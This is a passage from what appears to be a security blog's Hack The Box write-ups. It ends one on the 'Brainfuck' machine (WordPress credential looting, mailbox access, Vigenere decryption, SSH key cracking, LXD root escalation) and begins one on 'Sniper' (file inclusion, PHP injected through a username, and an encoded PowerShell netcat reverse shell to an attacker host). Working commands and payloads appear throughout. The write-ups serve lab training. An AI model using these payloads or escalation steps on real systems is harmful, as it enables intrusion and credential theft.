<h2 id="trying-to-abuse-wordpress-with-the-admin-account">Trying to abuse Wordpress with the Admin account</h2>
<p><em>After logging in as</em> <code class="language-plaintext highlighter-rouge">admin</code>, we find out that <strong>we have access to much more things</strong> than with <code class="language-plaintext highlighter-rouge">administrator</code></p>

<p><img src="/assets/Brainfuck/wp-admin-access.jpg" alt="" /></p>

<p><em>Because</em> <strong>Wordpress</strong> <em>themes use</em> <strong>PHP</strong>, we try to <strong>edit the templates</strong> and <strong>add a reverse shell.</strong></p>

<p>But <strong>our user didn’t seem to have that access.</strong></p>

<p><img src="/assets/Brainfuck/cant-edit-wp-themes.jpg" alt="" /></p>

<p>We instead try to <strong>upload a malicious plugin</strong>. <strong>No luck here either :/</strong></p>

<p><img src="/assets/Brainfuck/cant-upload-plugin.jpg" alt="" /></p>

<p><strong><em>Having phased out the traditional ways of exploiting Wordpress</em></strong>, we look around for other venues.</p>

<p>We <strong>find another plugin: Easy WP SMTP</strong> <strong><em>(the one hinted about in the home page)</em></strong></p>

<p><img src="/assets/Brainfuck/smtp-plugin-discovered.jpg" alt="" /></p>

<p><em>After going into its</em> <strong><em>settings</em></strong>, we notice <strong>a saved password</strong> that <strong>we can extract from the html</strong></p>

<p><img src="/assets/Brainfuck/smtp-password-looted.jpg" alt="" /></p>

<h2 id="rummaging-through-peoples-mailboxes-d">Rummaging through people’s mailboxes :D</h2>

<p><strong><em>Given the available IMAP service on port 143,</em></strong> we can go through the <code class="language-plaintext highlighter-rouge">orestis</code> user’s <strong>mailbox.</strong></p>

<p>We will <strong>install</strong> and <strong>configure a mail client</strong> called <code class="language-plaintext highlighter-rouge">evolution</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>evolution
</code></pre></div></div>

<p><em>After starting it,</em> we go to <strong>Edit &gt; Accounts</strong></p>

<p><img src="/assets/Brainfuck/evo-accounts.jpg" alt="" /></p>

<p><em>After selecting the</em> <strong>“Mail Account”</strong> <em>option</em>, we <strong>proceed through the account setup process</strong></p>

<p><img src="/assets/Brainfuck/evo-identity.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-rev-mail.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-send-mail.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-password.jpg" alt="" /></p>

<p>We <strong>successfully log in</strong> to find <strong>another set of credentials</strong> waiting for us in the <strong>inbox</strong> :D</p>

<p><img src="/assets/Brainfuck/forum-creds-in-mailbox.jpg" alt="" /></p>

<h2 id="visiting-the-forum">Visiting the Forum</h2>

<p><em>Going into the</em> <strong>forum</strong> at <code class="language-plaintext highlighter-rouge">https://sup3rs3cr3t.brainfuck.htb/</code>, we see nothing on the main page except for a <strong>test thread</strong></p>

<p><img src="/assets/Brainfuck/test-thread.jpg" alt="" /></p>

<p>We log in as <code class="language-plaintext highlighter-rouge">orestis</code> to find <strong>two more threads</strong>:</p>

<p><img src="/assets/Brainfuck/2-more-threads.jpg" alt="" /></p>

<p><strong><em>On the SSH Access thread:</em></strong></p>

<p><img src="/assets/Brainfuck/ssh-access-thread.jpg" alt="" /></p>

<p>It seems like <strong>the server administrator changed the SSH settings</strong> to <strong>only allow key-based authentication.</strong></p>

<p><em>This, however,</em> <strong>locked out</strong> the <code class="language-plaintext highlighter-rouge">orestis</code> user who now <strong>wants his key to regain access.</strong></p>

<p><strong><em>But, since exposing they key on the forum isn’t feasable,</em></strong> they decide to <strong>move to an encrypted thread</strong></p>

<p><img src="/assets/Brainfuck/encrypted-thread.jpg" alt="" /></p>

<p><strong>It’s gibberish here XD</strong></p>

<p>But the <strong>protocol notation</strong> <code class="language-plaintext highlighter-rouge">://</code> indicates that this <strong>might be a URL</strong>. Specially because <strong>the number of characters</strong> in <code class="language-plaintext highlighter-rouge">mnvze</code> <strong>matches the number of characters in</strong> <code class="language-plaintext highlighter-rouge">https</code>.</p>

<p><em>And since this thread is about</em> <code class="language-plaintext highlighter-rouge">orestis</code> <strong><em>receiving SSH access</em></strong>, we’re <strong>determined to figure this out :)</strong></p>

<p><em>But knowing i’m no wizard when it comes to</em> <strong><em>Cryptography</em></strong>, I <strong>seek Google’s help with a search: “detect cipher text”</strong></p>

<p><img src="/assets/Brainfuck/google-detect-cipher.jpg" alt="" /></p>

<p>I <strong>choose the first search result</strong> and paste in <strong>the longest line of text</strong>. This is <strong>to give the website a good sample for analysis</strong>.</p>

<p>Here were the results:</p>

<p><img src="/assets/Brainfuck/cipher-analysis.jpg" alt="" /></p>

<p>The tool <strong>is most confident in the cipher being of the “Vigenere type”.</strong></p>

<p>So I <strong>switch over</strong> to <strong>the Vigenere decryption page</strong> and <strong>select “Automatic Decryption”</strong></p>

<p><img src="/assets/Brainfuck/automatic-decryption-results.jpg" alt="" /></p>

<p>The results on the left showed that <strong>the tool is trying decryption keys like</strong>:</p>
<ul>
  <li>FUCKMYBBOIN</li>
  <li>FUCKMYLSOIN</li>
  <li>FUCKMYBBNIN</li>
  <li>FUCKMYBBCHN</li>
</ul>

<p>And <strong>getting some really coherent results</strong>. <strong><em>But not quite fully.</em></strong></p>

<p>So I decide to <strong>try some english words</strong> <strong><em>(since the sentence is in natural language).</em></strong></p>

<p><em>Following the machine’s naming,</em> <strong>I tried “FUCKMYBRAIN” as a key.</strong></p>

<p><img src="/assets/Brainfuck/cipher-decrypted.jpg" alt="" /></p>

<p><strong>It worked! XD</strong></p>

<h2 id="ssh-access-as-orestis">SSH Access as Orestis</h2>

<p><em>Visiting the url,</em> we <strong>get a private SSH key:</strong></p>

<p><img src="/assets/Brainfuck/ssh-key-found.jpg" alt="" /></p>

<p><strong>we’re asked for a passphrase</strong> when trying to use it.</p>

<p><img src="/assets/Brainfuck/passphrase-required.jpg" alt="" /></p>

<p>We <strong>convert the key to john format and crack it</strong> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code></p>

<p><img src="/assets/Brainfuck/key-cracked.jpg" alt="" /></p>

<p><strong>then login:</strong></p>

<p><img src="/assets/Brainfuck/in-as-orestis.jpg" alt="" /></p>

<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>

<p><em>Right after logging in,</em> and <strong><em>from the previous screenshot</em></strong>, we notice that <code class="language-plaintext highlighter-rouge">orestis</code> <strong>is part of the</strong> <code class="language-plaintext highlighter-rouge">lxd</code> <strong>group.</strong></p>

<p><img src="/assets/Brainfuck/lxd-group.jpg" alt="" /></p>

<p><em>Following the</em> <a href="/assets/Brainfuck/https://www.hackingarticles.in/lxd-privilege-escalation/">article</a> <em>from the awesome</em> <strong>Hacking Articles</strong> <em>blog</em>, we know that we can <strong>escalate our privileges</strong> using that membership.</p>

<p>Here’s a quoted <strong>brief description:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A member of the local "lxd" group can instantly escalate the privileges to root on the host operating system.
This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password.
The vulnerability exists even with the LXD snap package.

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post.
This gives a low-privilege user root access to the host filesystem. 
</code></pre></div></div>

<p>we first <strong>clone the</strong> <code class="language-plaintext highlighter-rouge">lxd-alpine-builder</code> <strong>repository</strong> and <strong>build the alpine image</strong> with the <code class="language-plaintext highlighter-rouge">build-alpine</code> <strong>script</strong> to get the <code class="language-plaintext highlighter-rouge">.tar.gz</code> files below:</p>

<p><img src="/assets/Brainfuck/building-alpine.jpg" alt="" /></p>

<p>And we <strong>transfer one over to the remote</strong> <code class="language-plaintext highlighter-rouge">/tmp</code> <strong>folder</strong></p>

<p><img src="/assets/Brainfuck/transfer-alpine.jpg" alt="" /></p>

<p><strong><em>To escalate our privileges,</em></strong> we:</p>

<ol>
  <li>Will first <strong>import the image</strong> and give it a suitable alias of <code class="language-plaintext highlighter-rouge">killerimage</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import alpine-v3.16-x86_64-20220816_1459.tar.gz <span class="nt">--alias</span> killerimage
</code></pre></div>    </div>
  </li>
  <li><strong>Verify that the import was a success</strong>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image list
</code></pre></div>    </div>
  </li>
  <li>Then <strong>initialize the image</strong> and <strong>create a container</strong> with the <code class="language-plaintext highlighter-rouge">security.privileged</code> option set to <code class="language-plaintext highlighter-rouge">true</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init killerimage brainfucked <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
</code></pre></div>    </div>
  </li>
  <li><strong>And proceed to mount the host’s root filesystem</strong> into the <code class="language-plaintext highlighter-rouge">/mnt/root</code> directory <strong>within the container</strong>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc config device add brainfucked mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Afterwards, start the container</strong> and <strong>execute a bourne shell</strong> (<code class="language-plaintext highlighter-rouge">sh</code>) (since it <strong><em>preserves the permission by default</em></strong>)
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc start brainfucked
lxc <span class="nb">exec </span>brainfucked /bin/sh
</code></pre></div>    </div>
  </li>
  <li><strong><em>And, with the root privilege</em></strong>, we will <strong>create an SUID bash</strong> in <code class="language-plaintext highlighter-rouge">/tmp</code> on the host
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /mnt/root/bin/bash /mnt/root/tmp/bash
<span class="nb">chmod</span> +s /mnt/root/tmp/bash
</code></pre></div>    </div>
  </li>
  <li><strong><em>After exiting the container shell,</em></strong> we can <strong>run the the SUID bash</strong> with the <code class="language-plaintext highlighter-rouge">-p</code> flag to <strong>execute as root</strong></li>
</ol>

<p><strong>It should all look like this:</strong></p>

<p><img src="/assets/Brainfuck/rooted.jpg" alt="" /></p>

<p><strong>A piece of cake :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Sniper</title><link href="http://localhost:4000/2022/08/05/Sniper.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Sniper" /><published>2022-08-05T00:00:00+02:00</published><updated>2022-08-05T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/05/Sniper</id><content type="html" xml:base="http://localhost:4000/2022/08/05/Sniper.html"><![CDATA[<p><img src="/assets/Sniper/Sniper.png" alt="Sniper" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>The box is a <strong>Windows</strong> machine <strong>hosting a PHP website</strong> which had both a <strong>LFI</strong> (intended) and a <strong>RFI</strong> (unintended) vulnerabilities.</li>
  <li><em>Down the LFI path, and after working around some</em> <strong>blacklisting</strong> <em>and</em> <strong>hardening</strong>, we manage to <strong>inject PHP code into the cookies</strong> and <strong>include them to gain RCE.</strong></li>
  <li>We gain initial access as <code class="language-plaintext highlighter-rouge">NT Authority\iusr</code>. And, <em>as we are taking a look around the</em> <strong>web root</strong>, we find <strong>credentials</strong> for a local user called <code class="language-plaintext highlighter-rouge">chris</code> in the <strong>database settings file.</strong></li>
  <li>We used <strong>PowerShell</strong> to gain <strong>another reverse shell</strong> as that user and started looking for ways to escalate our privileges.</li>
  <li><em>In <code class="language-plaintext highlighter-rouge">chris</code>’s <code class="language-plaintext highlighter-rouge">Downloads</code> folder</em>, we found a file called <code class="language-plaintext highlighter-rouge">instructions.chm</code> which mentioned <strong>some documentation work to be delivered to the company’s CEO</strong>.</li>
  <li><em>Also relevant to the same topic,</em> a folder called <code class="language-plaintext highlighter-rouge">Docs</code> in the root of the <code class="language-plaintext highlighter-rouge">C:</code> drive contained a <strong>note for the developer</strong> (<code class="language-plaintext highlighter-rouge">chris</code>) from the CEO <strong>asking for the documentation to be dropped there</strong> when done.</li>
  <li><em>To exploit the situation</em>, we create a <strong>malicious .CHM file</strong> using the <strong>Nishang PowerShell Suite</strong> to <strong>execute commands</strong> if that file was opened.</li>
  <li><em>After placing the file in the <code class="language-plaintext highlighter-rouge">Docs</code> folder</em>, a few moments pass and the file gets removed. We <strong>verify execution of our payload</strong> (resetting the <code class="language-plaintext highlighter-rouge">administrator</code>’s password) by logging in and we’re successfully authenticated.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-03T22:05:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 6h59m59s
</code></pre></div></div>

<p>Nmap gives us a few things to check:</p>
<ol>
  <li><strong>HTTP</strong> on Port 80</li>
  <li><strong>RPC</strong> on port 135</li>
  <li><strong>SMB</strong> on port 445</li>
</ol>

<p>We start with <strong>SMB</strong> and <strong>RPC</strong> since they are a quick check.</p>

<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>we check the usual <strong>null, anonymous and guest authentication</strong> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> but don’t get much past the <strong>OS</strong> and the <strong>hostname</strong>.
<img src="/assets/Sniper/SMB-Enum.jpg" alt="SMB-Enum" /></p>

<h2 id="rpc-enumeration">RPC Enumeration</h2>
<p>we use <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> but don’t get much information here either</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> sniper
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation           
                                                                                                                                                                                                                                    
 ==========================  
|    Target Information    |                                                                                                                                                                                                        
 ==========================                              
[*] Target ........... sniper                            
[*] Username ......... ''                                                                                                                                                                                                           
[*] Random Username .. 'stnvbvxv'                                                                                 
[*] Password ......... ''                                                                                                                                                                                                           
[*] Timeout .......... 5 second(s)                       
                                                                                                                  
 ==============================                    
|    Service Scan on sniper    |                                                                                  
 ==============================                                                                                                                                                                                                     
[*] Checking LDAP                                                                                                                                                                     
[-] Could not connect to LDAP on 389/tcp: timed out                                                                               
[*] Checking LDAPS                                                                                                                
[-] Could not connect to LDAPS on 636/tcp: timed out     
[*] Checking SMB                                                                                                  
[+] SMB is accessible on 445/tcp                       
[*] Checking SMB over NetBIOS                         
[+] SMB over NetBIOS is accessible on 139/tcp                                                                                     
                                                                                                                  
 ==============================================          
|    NetBIOS Names and Workgroup for sniper    |                 
 ==============================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out                                                                                  
                                                                                                                                                        
 ===================================                                                                              
|    SMB Dialect Check on sniper    |                                                                                                                   
 ===================================                                                                                                                    
[*] Trying on 445/tcp                                                                                             
[+] Supported dialects and settings:                                                                              
SMB 1.0: false                                                                                                                                                                        
SMB 2.02: true                                                                                                                    
SMB 2.1: true                                                                                                                     
SMB 3.0: true                                                                                                                                                                         
SMB1 only: false                                         
Preferred dialect: SMB 3.0                            
SMB signing required: false                            
                                                                                                                  
 ===================================                                                                                                                                                  
|    RPC Session Check on sniper    |                    
 ===================================                                                                              
[*] Check for null session                                                                                        
[-] Could not establish null session: STATUS_ACCESS_DENIED                                                                                              
[*] Check for random user session                                                                                                 
[-] Could not establish random user session: STATUS_INVALID_PARAMETER                                                                                   
[-] Sessions failed, neither null nor user sessions were possible                                                                                       
                                                                                                                                                        
 =====================================================           
|    Domain Information via SMB session for sniper    |                                                                                                                               
 =====================================================                      
[*] Enumerating via unauthenticated SMB session on 445/tcp                                                                                              
[+] Found domain information via SMB                                                                                                                                                  
NetBIOS computer name: SNIPER                                                                                                                                                         
NetBIOS domain name: ''                                                     
DNS domain: Sniper                                                          
FQDN: Sniper                                                                
                                                                                                                  
 =========================================                                                                                                              
|    OS Information via RPC for sniper    |                                                
 =========================================                                                                        
[*] Enumerating via unauthenticated SMB session on 445/tcp                                  
[+] Found OS information via SMB                                            
[*] Enumerating via 'srvinfo'                                               
[-] Skipping 'srvinfo' run, null or user session required                                                                                                                             
[+] After merging OS information we have the following result:                                                    
OS: Windows 10, Windows Server 2019, Windows Server 2016                                   
OS version: '10.0'                                                                                                
OS release: '1809'                                                                         
OS build: '17763'                                                                          
Native OS: not supported                                                                                          
Native LAN manager: not supported                                                                                                                       
Platform id: null                                                                                                 
Server type: null                                                                                                                                       
Server type string: null                                                                                          

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials                               
                                                                                                                  
Completed after 19.76 seconds 
</code></pre></div></div>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><em>On port 80,</em> we find a website
<img src="/assets/Sniper/website.jpg" alt="website" /></p>

<p>We get a <strong>login and registration form</strong> when we click the <strong>“User Portal”</strong><br />
<img src="/assets/Sniper/login-page.jpg" alt="login-page" /></p>

<p><img src="/assets/Sniper/register-page.jpg" alt="register-page" /></p>

<p>We run <code class="language-plaintext highlighter-rouge">sqlmap</code> on both forms but don’t find any <strong>SQL injection</strong> :/</p>

<h2 id="finding-a-file-inclusion-vulnerability">Finding a File Inclusion Vulnerability</h2>
<p><em>However, when we go to the</em> <strong>services page</strong> <em>and check the</em> <strong>url for the language</strong> <em>in the dropdown menu,</em> we notice something interesting:</p>

<p><img src="/assets/Sniper/spotting-lfi-param.jpg" alt="spotting-lfi-param" /></p>

<p>The <strong>lang</strong> parameter takes a <code class="language-plaintext highlighter-rouge">.php</code> file name. This looks like a <strong>file inclusion vulnerability.</strong></p>

<p><em>To verify it,</em> we first try to <strong>include a file we’re 100% sure exists.</strong></p>

<p>so we choose a <strong>CSS</strong> file from the <strong>source code</strong> of that page.</p>

<p><img src="/assets/Sniper/verifying-lfi.jpg" alt="verifying-lfi" /></p>

<p>and try including it</p>

<p><img src="/assets/Sniper/lfi-verified.jpg" alt="lfi-verified" /></p>

<p><strong>We have verified a Local File Inclusion here.</strong></p>

<p><em>In order to gain</em> <strong>RCE</strong> <em>from this,</em> we have a challenge to:</p>
<ol>
  <li>Find a file where we can <strong>inject PHP code</strong></li>
  <li>Be able to <strong>reference it through the vulnerability to get code execution</strong></li>
</ol>

<h2 id="targeting-cookies">Targeting Cookies</h2>
<p><strong>Cookies</strong> are a good place to start because:</p>
<ul>
  <li><strong>PHP stores the username inside them</strong> &amp; <strong>we have the ability to register users</strong></li>
  <li><em>Also, In Windows, by default,</em> they are kept in a <em>likely accessible</em> directory <code class="language-plaintext highlighter-rouge">"c:\windows\temp"</code></li>
  <li>Their file name has a known format: “<code class="language-plaintext highlighter-rouge">sess_&lt;PHPSESSID_COOKIE_VALUE&gt;</code>”</li>
</ul>

<p>So we need to:</p>
<ol>
  <li>Be able to <strong>write PHP code</strong> into the <strong>username field</strong> in the <strong>registration form</strong></li>
  <li><strong>Login with that username</strong> and <strong>get a cookie</strong></li>
  <li><strong>Reference that cookie file</strong> <em>using the</em> <strong>LFI vulnerability we found</strong></li>
</ol>

<p><strong><em>Sounds like a lot … and it is a lot XD</em></strong></p>

<h2 id="user-registration">User Registration</h2>
<p>We do a <strong>quick registration attempt</strong> to <strong>find out the limitations in user creation</strong>.</p>

<p>We used:</p>
<ul>
  <li><strong>Email:</strong> <code class="language-plaintext highlighter-rouge">"a@a"</code></li>
  <li><strong>Username:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
  <li><strong>Password:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
</ul>

<p>and the registration suceeded!</p>

<p><strong><em>This user has a special type of security. No one could ever guess creds like these :D :D</em></strong></p>

<p><em>After logging in,</em> the page looked like this:</p>

<p><img src="/assets/Sniper/login-success.jpg" alt="login-success" /></p>

<h2 id="including-the-cookie">Including the cookie</h2>
<p><em>Before going further,</em> we need to <strong>confirm we can reference the cookie on disk</strong>.</p>

<p>we can get the cookie from the <strong>Firefox developer tools.</strong></p>

<p><img src="/assets/Sniper/getting-cookies.jpg" alt="getting-cookies" /></p>

<p>We first try the <strong>full path</strong> to the cookie: <code class="language-plaintext highlighter-rouge">"c:\windows\temp\sess_bbv0f4mgcubtrvp548rvg62uui"</code></p>

<p>But that doesn’t work and we <strong>get an error page</strong></p>

<p><img src="/assets/Sniper/lfi-no-full-path.jpg" alt="lfi-no-full-path" /></p>

<p><em>After many many tries:</em></p>
<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Normal traversal sequences</strong> like <code class="language-plaintext highlighter-rouge">../../</code></li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Nested</strong> ones such as <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Single</strong> and <strong>Double URL encoding</strong></li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />and other techniques..</li>
</ul>

<p>I found out that I could include the cookie like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/windows/temp/sess_bbv0f4mgcubtrvp548rvg62uui
</code></pre></div></div>

<p><img src="/assets/Sniper/lfi-abs-path-success.jpg" alt="lfi-abs-path-success" /></p>

<p>That’s because the <strong>PHP</strong> code is likely:</p>
<ul>
  <li><strong>Not accepting</strong> any <code class="language-plaintext highlighter-rouge">..</code> sequences</li>
  <li><strong>Not accepting</strong> <code class="language-plaintext highlighter-rouge">c:</code> in the request</li>
  <li><strong>Doesn’t like the path</strong> when it’s missing a <code class="language-plaintext highlighter-rouge">/</code> or <code class="language-plaintext highlighter-rouge">\</code> in the beggining</li>
  <li><strong>But is alright with specifying the path without the</strong> <code class="language-plaintext highlighter-rouge">c:</code> <strong>part</strong></li>
</ul>

<p>We now know that <strong>we can include the input of the username field into the HTML.</strong></p>

<p>So we move on to the next step.</p>

<h2 id="finding-the-allowed-special-characters">Finding the allowed special characters</h2>
<p>We’re going to <strong>brute force all the special characters</strong> at the <strong>registration form</strong> using <strong>Burp</strong> and find out what’s allowed and what’s not.</p>

<p>Here are the <strong>requests and responses for both the registration and login</strong>.</p>

<p><em>Upon submitting the registration request,</em> the response we got was a <strong>302 redirection to the initial login page</strong></p>

<p><img src="/assets/Sniper/registratio-initial-request.jpg" alt="registratio-initial-request" /></p>

<p><em>When trying to login,</em> we get a <strong>302 redirect followed by a 200 OK</strong></p>

<p><img src="/assets/Sniper/login-success-redirect.jpg" alt="login-success-redirect" /></p>

<p><img src="/assets/Sniper/login-success-response.jpg" alt="login-success-response" /></p>

<p>I <strong>searched for a way to get all the special characters</strong> and found one using <code class="language-plaintext highlighter-rouge">python</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
<span class="k">print</span> <span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">)</span>
</code></pre></div></div>
<p><img src="/assets/Sniper/special-chars-using-python.jpg" alt="special-chars-using-python" /></p>

<p>we’re going to <strong>use those as payloads</strong> with <strong>Burp Intruder’s Sniper attack type</strong>. <em>Sniper :D</em></p>

<p><img src="/assets/Sniper/registration-brute-1.jpg" alt="registration-brute-1" /></p>

<p><img src="/assets/Sniper/registration-brute-2.jpg" alt="registration-brute-2" /></p>

<p><em>after launching the attack,</em> we notice that <strong>we get a 302 response with all requests (32 total) and with a fixed length of 292</strong></p>

<p><img src="/assets/Sniper/registration-brute-3.jpg" alt="registration-brute-3" /></p>

<p><strong>are ALL special characters allowed?</strong></p>

<p><em>if true,</em> we would <strong>want to verify that.</strong></p>

<p><em>otherwise,</em> we would get ourselves into a <strong>blind, mindless and merciless loop of trial-and-error.</strong></p>

<p>We’re going to do <strong>the same brute force attack with the login form</strong> to <strong>see which ones would log in and -by extension- give us cookies that we can include</strong></p>

<p><img src="/assets/Sniper/login-brute-1.jpg" alt="login-brute-1" /></p>

<p><img src="/assets/Sniper/login-brute-2.jpg" alt="login-brute-2" /></p>

<p>the results show that <strong>there were -in fact- blacklisted characters</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" $ &amp; ( - . ; [ \ _
</code></pre></div></div>
<p>and the allowed ones:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>! # % ' ) * + , / : &lt; = &gt; ? @ ] ^ ` { | } ~
</code></pre></div></div>

<p>this is good! Because:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">?</code> are needed for the <strong>tags</strong> needed to <strong>inject PHP</strong></li>
  <li>and the <strong>backtick</strong> can be used for <strong>code execution</strong> (<em>just like in</em> <strong>Bash</strong>)</li>
</ul>

<p>we can craft a <strong>payload</strong> like this:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="sb">`whoami`</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<p><em>after logging in,</em> we get the cookie value from the browser and are able to get <strong>code execution.</strong></p>

<p><img src="/assets/Sniper/rce-achieved.jpg" alt="rce-achieved" /></p>

<h2 id="stomping-the-blacklisting-with-powershell">Stomping the blacklisting with PowerShell</h2>
<p><em>with</em> <strong>RCE</strong> <em>achieved,</em> we have to find a way to <strong>execute a reverse shell with the allowed characters we have.</strong></p>

<p><strong>We have a couple of challenges here:</strong></p>
<ul>
  <li>the <strong>dollar sign</strong> (<code class="language-plaintext highlighter-rouge">$</code>), the <strong>semi-colon</strong> (<code class="language-plaintext highlighter-rouge">;</code>), the <strong>brackets</strong> <code class="language-plaintext highlighter-rouge">(</code> and <code class="language-plaintext highlighter-rouge">[</code> along with the <strong>underscore</strong> (<code class="language-plaintext highlighter-rouge">_</code>) are blocked, which enable the standard <strong>PHP backdoor</strong> <code class="language-plaintext highlighter-rouge">&lt;?php exec($_REQUEST["cmd"]);?&gt;</code></li>
  <li><em>also,</em> the <strong>dot</strong> (<code class="language-plaintext highlighter-rouge">.</code>) is blocked, so we can’t use our <strong>ip address</strong> in the payload to download something.</li>
  <li><em>And, with the</em> <strong>backslash</strong> <code class="language-plaintext highlighter-rouge">\</code> <em>blocked as well,</em> it means <strong>writing to paths other that the current directory isn’t allowed</strong></li>
</ul>

<p><em>when thinking about using</em> <strong>PowerShell</strong> <em>in execution,</em> I remembered that we could use the encoded switch <code class="language-plaintext highlighter-rouge">-E</code> and pass <strong>base64-encoded commands.</strong></p>

<p>This <strong>feature</strong> was <em>initially built</em> to <strong>make handling tricky sequences of special characters easier.</strong></p>

<p><em>Even though the dash</em> (<code class="language-plaintext highlighter-rouge">-</code>) <em>is blocked</em>, <strong>this trick is still doable</strong> with the <em>whitelisted</em> <strong>forward slash</strong> (<code class="language-plaintext highlighter-rouge">/</code>).</p>

<p>This is similar to <strong>regular windows commands</strong> (ex: <code class="language-plaintext highlighter-rouge">ipconfig /all</code>)</p>

<p>we test out a simple <strong>PowerShell</strong> command <code class="language-plaintext highlighter-rouge">get-date</code></p>

<p><img src="/assets/Sniper/powershell-encoding.jpg" alt="powershell-encoding" /></p>

<p>notice the encoding type is set to <strong>UTF-16LE</strong>. That’s what <strong>PowerShell</strong> expects when using that parameter.</p>

<p><img src="/assets/Sniper/powershell-encoded-execution.jpg" alt="powershell-encoded-execution" /></p>

<p><em>After verifying that this method works, and after failing with many reverse shell options,</em> I set up an <strong>Impacket SMB Server</strong> and hosted <code class="language-plaintext highlighter-rouge">netcat</code> (the 64-bit version) and <strong>managed to get code execution with this payload</strong>:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="sb">`powershell /e XABcADEAMAAuADEAMAAuADEANgAuADMAXABzAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANgAuADMAIAA5ADAAMAAwAA==`</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p>which is:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.16.3\s\nc64.exe -e powershell 10.10.16.3 9000
</code></pre></div></div>

<p><em>thankfully, after all this hard work,</em> we’re rewarded with a <strong>reverse shell :D</strong></p>

<p><img src="/assets/Sniper/shell-as-iusr.jpg" alt="shell-as-iusr" /></p>

<h2 id="finding-creds-in-the-database-settings-file-like-always">Finding creds in the database settings file (<em>like always</em>)</h2>
<p><em>The first thing I did after getting the shell,</em> was <strong>check the files in the web root.</strong></p>

<p>I found a file called <code class="language-plaintext highlighter-rouge">db.php</code> in the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user</code> directory.</p>

<p><strong>The contents were:</strong></p>

<p><img src="/assets/Sniper/creds-in-db-php.jpg" alt="creds-in-db-php" /></p>

